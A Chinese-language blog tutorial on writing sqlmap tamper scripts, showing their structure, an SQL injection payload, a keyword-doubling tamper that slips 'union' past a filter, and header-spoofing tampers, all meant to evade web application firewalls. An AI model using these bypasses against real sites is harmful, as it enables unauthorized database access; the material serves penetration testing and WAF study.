---
layout: post
title:  "sqlmap-tamper编写指南"
date:   2016-6-06 09:31:40 +0800
categories: web
---
> 注：最近遇到了一些奇奇怪怪的waf，想自己写一些tamper但是发现没有参考材料可以使用，因此写了这篇文章，以方便进行自定义的tamper编写。笔者笔力有限，如有错误，敬请读者们指正。

## 0x00 sqlmap tamper简介

sqlmap是一个自动化的SQL注入工具，而tamper则是对其进行扩展的一系列脚本，主要功能是对本来的payload进行特定的更改以绕过waf。

<!--more-->

## 0x01 一个最小的例子

为了说明tamper的结构，让我们从一个最简单的例子开始

```python
# sqlmap/tamper/escapequotes.py

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOWEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    return payload.replace("'", "\\'").replace('"', '\\"')
```

不难看出，一个最小的tamper脚本结构为priority变量定义和dependencies、tamper函数定义。

priority定义脚本的优先级，用于有多个tamper脚本的情况。

dependencies函数声明该脚本适用/不适用的范围，可以为空。

tamper是主要的函数，接受的参数为payload和\*\*kwargs
返回值为替换后的payload。比如这个例子中就把引号替换为了``\\\\'``。

## 0x02 详细介绍

第一部分完成了一个最简单的tamper架构，下面我们进行更详细的介绍

#### tamper函数

tamper是整个脚本的主体。主要用于修改原本的payload。举例来说，如果服务器上有这么几行代码

```php
$id = trim($POST($id),'union');
$sql="SELECT * FROM users WHERE id='$id'";
```

而我们的payload为
```mysql
-8363'  union select null -- -
```

这里因为union被过滤掉了，将导致payload不能正常执行，那么就可以编写这样的tamper

```python
def tamper(payload, **kwargs):
    return payload.replace('union','uniounionn')
```

保存为replaceunion.py，存到sqlmap/tamper/下，执行的时候带上--tamper=replaceunion的参数，就可以绕过该过滤规则


#### dependencies函数

dependencies函数，就tamper脚本支持/不支持使用的环境进行声明，一个简单的例子如下：

```python
# sqlmap/tamper/echarunicodeencode.py

from lib.core.common import singleTimeWarnMessage

def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against ASP or ASP.NET web applications" % os.path.basename(__file__).split(".")[0])

# singleTimeWarnMessage() 用于在控制台中打印出警告信息

```

#### kwargs

在官方提供的47个tamper脚本中，kwargs参数只被使用了两次，两次都只是更改了http-header，这里以其中一个为例进行简单说明

```python
# sqlmap/tamper/vanrish.py

def tamper(payload, **kwargs):
    headers = kwargs.get("headers", {})
    headers["X-originating-IP"] = "127.0.0.1"
    return payload
```

这个脚本是为了更改X-originating-IP，以绕过WAF，另一个kwargs的使用出现于xforwardedfor.py，也是为了改header以绕过waf

## 0x3 结语

tamper的编写远不止这些，本文只就其最基本的结构进行探讨。作为sqlmap的扩展，在编写tamper时几乎所有的sqlmap内置的函数、变量都可以使用，本文不一一列出。


## 0x04 附录：部分常数值

```python
# sqlmap/lib/enums.py

class PRIORITY:
    LOWEST = -100
    LOWER = -50
    LOW = -10
    NORMAL = 0
    HIGH = 10
    HIGHER = 50
    HIGHEST = 100


class DBMS:
    ACCESS = "Microsoft Access"
    DB2 = "IBM DB2"
    FIREBIRD = "Firebird"
    MAXDB = "SAP MaxDB"
    MSSQL = "Microsoft SQL Server"
    MYSQL = "MySQL"
    ORACLE = "Oracle"
    PGSQL = "PostgreSQL"
    SQLITE = "SQLite"
    SYBASE = "Sybase"
    HSQLDB = "HSQLDB"

```
